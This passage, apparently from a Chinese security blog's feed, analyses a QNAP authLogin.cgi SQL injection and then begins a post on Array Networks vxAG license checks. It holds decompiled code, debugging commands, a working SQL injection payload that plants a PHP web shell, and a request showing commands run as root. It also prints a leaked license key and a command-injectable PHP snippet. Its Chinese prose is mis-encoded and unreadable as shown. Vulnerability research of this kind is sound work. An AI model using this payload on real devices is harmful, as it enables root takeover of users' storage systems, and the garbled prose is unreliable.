class="keyword">goto</span> LABEL_63;</span><br><span class="line">      <span class="keyword">if</span> ( !client_id )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !Get_App_Token(app, byte_43AB0A, v78, <span class="number">257LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">        <span class="built_in">memset</span>(v78, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !Gen_App_Token(app, byte_43AB0A, v78, <span class="number">257LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">        v48 = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !Get_App_Token_by_Client_ID(app, v51, client_id, v78, <span class="number">257LL</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">    <span class="built_in">memset</span>(v78, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">    v43 = v22;</span><br><span class="line">    v44 = client_agent;</span><br><span class="line">    v45 = client_app;</span><br><span class="line">    v46 = client_id;</span><br><span class="line">    v47 = v51;</span><br><span class="line">LABEL_32:</span><br><span class="line">    <span class="keyword">if</span> ( !Gen_App_Token_by_Client_ID(app, v47, v46, v45, v44, v43, v78, <span class="number">257LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_33:</span><br><span class="line">      v48 = <span class="number">0</span>;</span><br><span class="line">      sub_40F730(<span class="string">&quot;app_token&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%s&quot;</span>, v34, v35, v36, v37, v38, v39, v40, v41, v78, v30, v31, v32, v33, v64);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_411020();</span><br><span class="line">  <span class="keyword">if</span> ( Get_App_Token_Support(app) )</span><br><span class="line">  &#123;</span><br><span class="line">    v48 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">  &#125;</span><br><span class="line">  client_id = v79;</span><br><span class="line">  v42 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !app_token )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="keyword">if</span> ( !*app_token )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">  <span class="keyword">if</span> ( !renew )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !auth )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( client_id )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( Verify_App_Token_by_Client_ID(client_id, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_113:</span><br><span class="line">          v48 = <span class="number">-1</span>;</span><br><span class="line">          sub_40EB90(app, v74, client_id, client_app, client_agent);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( Verify_App_Token(app, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_116:</span><br><span class="line">        v48 = <span class="number">-1</span>;</span><br><span class="line">        sub_40EB90(app, v74, <span class="number">0LL</span>, client_app, client_agent);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_63:</span><br><span class="line">      v48 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( client_id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Verify_App_Token_by_Client_ID(client_id, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( Verify_App_Token(app, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">      v48 = <span class="number">-1</span>;</span><br><span class="line">      sub_40EB90(app, v74, client_id, client_app, client_agent);</span><br><span class="line">      <span class="keyword">if</span> ( !v42 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">LABEL_51:</span><br><span class="line">      sub_40F730(<span class="string">&quot;client_id&quot;</span>, <span class="number">0LL</span>, v79, v34, v35, v36, v37, v38, v39, v40, v41, v29, v30, v31, v32, v33, v64);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(v80, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( qtoken_query_by_token(app_token, &amp;v71) || (v52 = *(v71 + <span class="number">68</span>), v52 == <span class="number">-1</span>) )</span><br><span class="line">      v53 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v53 = v52 + *(v71 + <span class="number">64</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sub_40EA10(app, v80, <span class="number">257LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v54 = client_app ? client_app : v80;</span><br><span class="line">      <span class="keyword">if</span> ( !auth_add_session_ex(&amp;v72, v74, <span class="number">1LL</span>, <span class="string">&quot;&quot;</span>, client_id, v54, client_agent, v53) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_411BA0(&amp;v72);</span><br><span class="line">        v55 = time(<span class="number">0LL</span>);</span><br><span class="line">        Update_Token_Last_Access_Time(app_token, v55);</span><br><span class="line">        <span class="built_in">memset</span>(v82, <span class="number">0</span>, <span class="number">0x1C8</span>uLL);</span><br><span class="line">        <span class="built_in">memset</span>(v81, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( app )</span><br><span class="line">        &#123;</span><br><span class="line">          CGI_Get_Http_Info(v82);</span><br><span class="line">          <span class="keyword">if</span> ( !sub_40EA10(app, v81, <span class="number">257LL</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( LOBYTE(v74[<span class="number">0</span>]) )</span><br><span class="line">              v56 = v74;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v56 = <span class="string">&quot;---&quot;</span>;</span><br><span class="line">            v70 = v56;</span><br><span class="line">            <span class="keyword">if</span> ( is_https() )</span><br><span class="line">              v57 = <span class="number">11LL</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v57 = <span class="number">3LL</span>;</span><br><span class="line">            v58 = <span class="string">&quot;---&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( client_id )</span><br><span class="line">              v58 = client_id;</span><br><span class="line">            <span class="keyword">if</span> ( client_app )</span><br><span class="line">              v59 = client_app;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v59 = v81;</span><br><span class="line">            <span class="keyword">if</span> ( client_agent )</span><br><span class="line">              v60 = client_agent;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v60 = <span class="string">&quot;Agent&quot;</span>;</span><br><span class="line">            SendConnToLogEngineEx4(<span class="number">0LL</span>, v70, v81, &amp;v83, <span class="string">&quot;---&quot;</span>, v57, <span class="number">10LL</span>, <span class="number">0LL</span>, v58, v59, v60, <span class="string">&quot;Administration&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">memset</span>(v82, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( !sub_40EA10(app, v82, <span class="number">257LL</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( client_id )</span><br><span class="line">              v61 = client_id;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v61 = <span class="string">&quot;---&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( client_app )</span><br><span class="line">              v62 = client_app;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v62 = v82;</span><br><span class="line">            <span class="keyword">if</span> ( client_agent )</span><br><span class="line">              v63 = client_agent;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v63 = <span class="string">&quot;Agent&quot;</span>;</span><br><span class="line">            v48 = <span class="number">0</span>;</span><br><span class="line">            shm_add_http_user_with_client_info(v74, <span class="string">&quot;Administration&quot;</span>, <span class="string">&quot;---&quot;</span>, v61, v62, v63);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_63;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_109:</span><br><span class="line">    v48 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( client_id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !Verify_App_Token_by_Client_ID(client_id, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v43 = v22;</span><br><span class="line">      v44 = client_agent;</span><br><span class="line">      v45 = client_app;</span><br><span class="line">      v46 = client_id;</span><br><span class="line">      v47 = v74;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_113;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( Verify_App_Token(app, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_116;</span><br><span class="line">  <span class="keyword">if</span> ( !Gen_App_Token(app, v74, v78, <span class="number">257LL</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">  v48 = <span class="number">-1</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">LABEL_35:</span><br><span class="line">  v49 = sub_40F730(<span class="string">&quot;result&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%d&quot;</span>, v34, v35, v36, v37, v38, v39, v40, v41, v48, v30, v31, v32, v33, v64);</span><br><span class="line">  sub_411060(v49);</span><br><span class="line">  qtoken_release(v71);</span><br><span class="line">  <span class="keyword">return</span> v48;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°ä¼šè°ƒç”¨ so åº“ä¸­çš„ Verify_App_Tokenï¼Œæœ€ç»ˆä½¿ç”¨åˆ°å­˜åœ¨æ¼æ´çš„å‡½æ•°ã€‚</p>
<p>æ­¤å‡½æ•°é€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œç®€è¦æè¿°ä»å‡½æ•°å…¥å£åˆ° Verify_App_Token è°ƒç”¨ä½ç½®æµç¨‹ï¼šé¦–å…ˆè·å– appã€user ç­‰å¿…è¦å‚æ•°ï¼Œç„¶ååˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¼ å…¥äº† gen_client_idï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™è°ƒç”¨ Get_App_Token_Support å¹¶ä¼ å…¥ app å‚æ•°ï¼Œå°è¯•è·å– app ç›¸å…³é…ç½®ä¿¡æ¯ã€‚</p>
<p>Get_App_Token_Support å‡½æ•°è°ƒç”¨ lib åº“ä¸­çš„ Get_App_Token_Support_Listï¼Œæ­¤å‡½æ•°ä½¿ç”¨ä¸€äº›å›ºå®šå­—ç¬¦ä¸²æ„é€ å‡ºä¸€ç³»åˆ— app å¯¹è±¡å¹¶è¿”å›ï¼ŒåŒ…æ‹¬ MUSIC_STATIONã€PHOTO_STATION ç­‰ã€‚</p>
<p>ä¹‹åä»£ç ä¼šåˆ¤æ–­ç”¨æˆ·ä¼ å…¥çš„ app å‚æ•°æ˜¯å¦å’Œè¿™äº› app å¯¹è±¡ä¸­çš„ä¸€ä¸ªç›¸åŒ¹é…ï¼Œå¦‚æœæ‰¾ä¸åˆ°ä»»ä½•åŒ¹é…åˆ™é€€å‡ºã€‚</p>
<p>å¦‚æœæ‰¾åˆ°äº†æŸä¸ªåŒ¹é…ï¼Œç»§ç»­åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¼ å…¥äº† app_token å‚æ•°ï¼Œå¦‚æœç”¨æˆ·ä¼ é€’äº† app_tokenï¼Œå¹¶ä¸”æ²¡æœ‰ä¼ é€’ renewã€authã€client_id ä¸‰ä¸ªå‚æ•°ï¼Œä»£ç å°±ä¼šè°ƒç”¨ Verify_App_Token å¹¶å°† app_token ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚</p>
<p>ä¹‹åå°±ä¼šæ¥åˆ°æ¼æ´ç‚¹ï¼Œå°† app_token æ‹¼æ¥åˆ° token æŸ¥è¯¢è¯­å¥ä¹‹åï¼Œä½¿ç”¨ sqlite3_exec æ‰§è¡Œã€‚</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒè¯•æ¥ç¡®å®šä»¥ä¸Šåˆ†ææ˜¯å¦æ­£ç¡®ã€‚ç›®æ ‡ç¨‹åºä¸ºä¸€ä¸ªåŠ¨æ€è°ƒç”¨çš„ cgiï¼Œå¯é€šè¿‡å¾ªç¯é™„åŠ å®ç°è°ƒè¯•ã€‚</p>
<p>ä¸Šä¼ ä¸€ä¸ª gdbserver åˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œç„¶ååœ¨è®¾å¤‡ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span> ./gdbserver 0.0.0.0:12345 --attach `ps | grep authLogin | <span class="built_in">head</span> -n1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`;<span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>

<p>å®¢æˆ·ç«¯ gdb è°ƒè¯•æ–‡ä»¶</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file ./home/httpd/cgi-bin/authLogin.cgi</span><br><span class="line">b *0x00000000040F574</span><br><span class="line">target remote 192.168.0.177:12345</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å°†æ–­ç‚¹ä¸‹åœ¨è°ƒç”¨ Verify_App_Token å‡½æ•°çš„ä½ç½®ã€‚</p>
<p>å‘é€ä»¥ä¸‹æ•°æ®åŒ…ï¼Œæ³¨æ„è¦åœ¨ client_agent å‚æ•°ä¸­å¡«å…¥è¾ƒå¤šçš„å­—ç¬¦ï¼Œå¦åˆ™ç¨‹åºè¿è¡Œå¤ªå¿«ä¼šé”™è¿‡å…³é”®ä½ç½®ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/authLogin.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.177:5000</span><br><span class="line">Content-Length: 158</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">app=MUSIC_STATION&amp;app_token=123&amp;sid=1&amp;client_app=1&amp;client_agent=&lt;&quot;a&quot; * 0x3000&gt;</span><br></pre></td></tr></table></figure></div>

<p>å‘åŒ…ä¹‹å gdb åœ¨æ–­ç‚¹ä½ç½®æ–­ä¸‹ï¼Œæ‰¾åˆ° libLinux_NAS åº“æ–‡ä»¶çš„åŸºåœ°å€ï¼ŒåŠ ä¸Šåç§»é‡ï¼Œåœ¨æ¼æ´å‡½æ•° sqlite3_exec ä½ç½®ä¸‹æ–­ç‚¹ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-4.png"
                     
                ></p>
<p>æ‰§è¡Œåˆ° sqlite3_exec æ—¶ï¼Œsql è¯­å¥çš„å†…å®¹ä¸º <code>SELECT * FROM QTOKEN WHERE token = &#39;123&#39;   ;</code>ï¼Œtoken éƒ¨åˆ†åˆšå¥½æ˜¯æˆ‘ä»¬ä¼ é€’çš„ app_token å‚æ•°å€¼ã€‚</p>
<p>ç›®æ ‡æ•°æ®åº“ä¸º sqliteï¼Œé€šç”¨æ‰‹æ®µå¯ä»¥é€šè¿‡ ATTACH DATABASE åˆ›å»ºåé—¨ php æ–‡ä»¶ï¼Œè¿™é‡Œåˆ—ä¸¾ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼šQNAP ç³»ç»Ÿä¸­æœ‰ä¸€äº›ä½¿ç”¨ç‡è¾ƒé«˜çš„æ’ä»¶æ˜¯ç”± PHP ç¼–å†™çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿™å°è®¾å¤‡ä¸­å®‰è£…äº† Music Stationï¼Œè¿™æ˜¯ä¸€ä¸ªå¯ä»¥æ•´åˆè®¾å¤‡ä¸ŠéŸ³ä¹èµ„æºçš„ç¨‹åºï¼Œå…¶å®‰è£…è·¯å¾„é»˜è®¤ä½äº <code>/share/CACHEDEV1_DATA/.qpkg/musicstation/</code>ï¼Œæˆ‘ä»¬é€šè¿‡æ¼æ´åœ¨è¯¥è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªåé—¨æ–‡ä»¶ qnaptest.phpï¼Œpayload å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27;;ATTACH DATABASE &#x27;/share/CACHEDEV1_DATA/.qpkg/musicstation/qnaptest.php&#x27; AS qnapkey;CREATE TABLE qnapkey.key (dataz text);INSERT INTO qnapkey.key (dataz) VALUES (&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;);--</span><br></pre></td></tr></table></figure></div>

<p>å°†å…¶ URL ç¼–ç æ”¾åœ¨ app_token å‚æ•°ä¸­ï¼Œå‘åŒ…åå¯ä»¥çœ‹åˆ° qnaptest.php æˆåŠŸåˆ›å»ºï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-5.png"
                     
                ></p>
<p>ä¹‹åè®¿é—®è¯¥æ–‡ä»¶å³å¯ä»¥ root èº«ä»½æ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /musicstation/qnaptest.php?cmd=id HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">================================================</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 06 Feb 2023 08:36:43 GMT</span><br><span class="line">Server:  </span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; ; object-src &#x27;self&#x27; ; worker-src &#x27;self&#x27; blob:</span><br><span class="line">Upgrade: h2</span><br><span class="line">Connection: Upgrade, close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">Strict-Transport-Security: max-age=0</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 8197</span><br><span class="line"></span><br><span class="line">SQLite format 3 /Gtablekeykey CREATE TABLE key (dataz text) Iuid=0(admin) gid=0(administrators)</span><br></pre></td></tr></table></figure></div>

<h3 id="å‚è€ƒæ–‡ç« -x2F-æ‹“å±•é˜…è¯»"><a href="#å‚è€ƒæ–‡ç« -x2F-æ‹“å±•é˜…è¯»" class="headerlink" title="å‚è€ƒæ–‡ç« &#x2F;æ‹“å±•é˜…è¯»"></a>å‚è€ƒæ–‡ç« &#x2F;æ‹“å±•é˜…è¯»</h3><p>QNAP å®˜æ–¹å‘å¸ƒçš„<a class="link"   href="https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01" >æ¼æ´é€šå‘Š<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>CWE-89 çš„<a class="link"   href="https://cwe.mitre.org/data/definitions/89.html" >å®šä¹‰<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>ç¬¬ä¸‰æ–¹å®‰å…¨<a class="link"   href="https://www.secrss.com/articles/51499" >é€šå‘Š<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>Array Networks vxAG è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ (äºŒ)</title>
    <url>/2022/12/20/ArrayVPN_rce2/</url>
    <content><![CDATA[<p>æœ¬æ–‡ä¸º Array Networks vxAG è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æçš„ç¬¬äºŒéƒ¨åˆ†ï¼Œä¸»è¦ä»‹ç»è®¾å¤‡ License å’Œ VPN å®‰å…¨é—®é¢˜ã€‚</p>
<span id="more"></span>

<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>æ­£å¸¸å¯¼å…¥è®¾å¤‡åé»˜è®¤å¤„äºè¯•ç”¨çŠ¶æ€ï¼Œåªèƒ½ä½¿ç”¨éƒ¨åˆ†åŸºæœ¬åŠŸèƒ½ï¼ŒVPN ç­‰åŠŸèƒ½éœ€è¦å¯¼å…¥åˆé€‚çš„ License ä¹‹åæ‰èƒ½å¼€å¯ã€‚</p>
<p>(æœªå¯¼å…¥ License æ—¶ï¼Œæ”¯æŒçš„åŠŸèƒ½ä¸ºç©º)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_02.png"
                     
                ></p>
<p>(æ— æ³•ä½¿ç”¨ VPN åŠŸèƒ½)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_01.png"
                     
                ></p>
<p>æ­£å¸¸æ¥è®²ï¼Œæˆ‘ä»¬éœ€è¦è·å–è¯•ç”¨ç‰ˆ Licenseï¼Œæˆ–è€…åˆ†æéªŒè¯é€»è¾‘ï¼Œæ„é€ å‡ºåˆé€‚çš„ License æ¥è§£é”å„é¡¹åŠŸèƒ½ï¼Œä½†æ˜¯å¯¹äºè¿™æ¬¾è®¾å¤‡æ¥è¯´ï¼Œæœ‰ä¸€ç§æ›´æ–¹ä¾¿çš„æ–¹æ³•ã€‚</p>
<p>åœ¨æŸå¹³å°çš„è®¾å¤‡å¸®åŠ©æ‰‹å†Œä¸­ï¼Œæˆ‘æ‰¾åˆ°äº†å¦‚ä¸‹æˆªå›¾ä¿¡æ¯ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_03.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_04.png"
                     
                ></p>
<p>æ–‡æ¡£ä¸­ä»‹ç»äº†å¦‚ä½•éƒ¨ç½²è®¾å¤‡ä»¥åŠæ¿€æ´» Licenseï¼Œå…¶ä¸­çš„æˆªå›¾åŒ…å«ä¸€ä¸ªå·²ç»è¿‡æœŸçš„å…·æœ‰ VPN æ¨¡å—æˆæƒçš„ License (J1ErSzPo-3TiY8OYU-bTEsUFdn-wfA&#x3D;#131-4d67d9ab-a9cf1726-4c67eaa3-beef0123-4d#7ebaa-9cfe1#dc-ba98765)ï¼Œåˆ°æœŸæ—¶é—´ä¸º 2016 å¹´ 5 æœˆ 9 æ—¥ã€‚è€ƒè™‘èƒ½å¦ç›´æ¥å°†è¿™ä¸ª License å¯¼å…¥è®¾å¤‡ä¸­å‘¢ï¼Ÿ</p>
<p>å°è¯•ä¿®æ”¹æ—¶é—´ä¹‹åå¯¼å…¥ Licenseï¼Œè®¾å¤‡ä¼šæŠ¥ License éæ³•é”™è¯¯ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_05.png"
                     
                ></p>
<p>çŒœæµ‹æ¯ä¸ª License å¯¹åº”ä¸€ä¸ªè®¾å¤‡çš„åºåˆ—å·ï¼Œæˆªå›¾ä¸­å¯¹åº”çš„åºåˆ—å·ä¸ºï¼š4B756D5412DC3000000605120655416ï¼Œæƒ³è¦å¯¼å…¥ License çš„è¯å¯ä»¥è€ƒè™‘ä¿®æ”¹è®¾å¤‡åºåˆ—å·ï¼Œæˆ–è€…ç®€å•åˆ†æä¸€ä¸‹ License éªŒè¯é€»è¾‘ã€‚</p>
<p>é¦–å…ˆå®šä½åˆ°éªŒè¯é€»è¾‘çš„å…¥å£ç‚¹ï¼šclass.cliWrap_gLicense.php</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> (<span class="variable language_">$this</span>-&gt;classId . <span class="string">&#x27;_gLicenseImportValidate&#x27;</span>):</span><br><span class="line">	<span class="variable">$t_licenseCode</span> = <span class="variable">$_POST</span>[<span class="variable language_">$this</span>-&gt;classId . <span class="string">&#x27;_license_code&#x27;</span>];		<span class="comment">// è·å– license code</span></span><br><span class="line">	<span class="comment">//echo &#x27;Import With Validate.&lt;br&gt;LicCode=&#x27; . $t_licenseCode . &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">					</span><br><span class="line">	<span class="variable">$t_errStr</span> = cli::<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;system license &quot;&#x27;</span> . <span class="variable">$t_licenseCode</span> . <span class="string">&#x27;&quot;&#x27;</span>);    <span class="comment">// æ‰§è¡Œ cli å‘½ä»¤éªŒè¯</span></span><br><span class="line">	<span class="keyword">if</span> (!(<span class="variable">$t_errStr</span>-&gt;result)) &#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;jsOnLoadEnd .= <span class="string">&#x27;g_errStr += &quot;&#x27;</span> . language::<span class="title function_ invoke__">translate</span>(<span class="string">&#x27;alert_messageAlertFromSP&#x27;</span>) . <span class="string">&#x27;\n\n&#x27;</span> . (<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">addslashes</span>(cli::<span class="title function_ invoke__">get_reason_info</span>(<span class="variable">$t_errStr</span>)))))) . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$t_result</span> = <span class="string">&#x27;License Key verification succeeded&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$t_errStr</span>-&gt;content[<span class="number">0</span>], <span class="string">&quot;SVD is not licensed on this system&quot;</span>) != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">			<span class="variable">$t_result</span> .= <span class="string">&quot;&lt;br&gt;The SVD function has been disabled automatically because it is not included in this new license.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;jsOnLoadEnd .= <span class="string">&#x27;showSPMessage(&quot;status&quot;, &quot;&#x27;</span> . language::<span class="title function_ invoke__">translate</span>(<span class="string">&#x27;status_operation_successful&#x27;</span>) . <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span> . <span class="variable">$t_result</span> . <span class="string">&#x27;&quot;);&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p>ä»£ç ä¼šè°ƒç”¨ system license CLI å‘½ä»¤éªŒè¯ License å†…å®¹ã€‚å…¨å±€æœç´¢ä¹‹å‰çš„æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°å…¶å‡ºç°åœ¨ &#x2F;ca&#x2F;bin&#x2F;backend äºŒè¿›åˆ¶ä¸­ã€‚</p>
<p>ç®€å•åˆ†æé€»è¾‘ï¼Œset_license å‡½æ•°è´Ÿè´£æ£€æŸ¥å’Œè®¾ç½® Licenseï¼Œå…¶ä¸­ä¼šè°ƒç”¨ decode_actkey å‡½æ•°æ¥è§£ç  License å†…å®¹ã€‚</p>
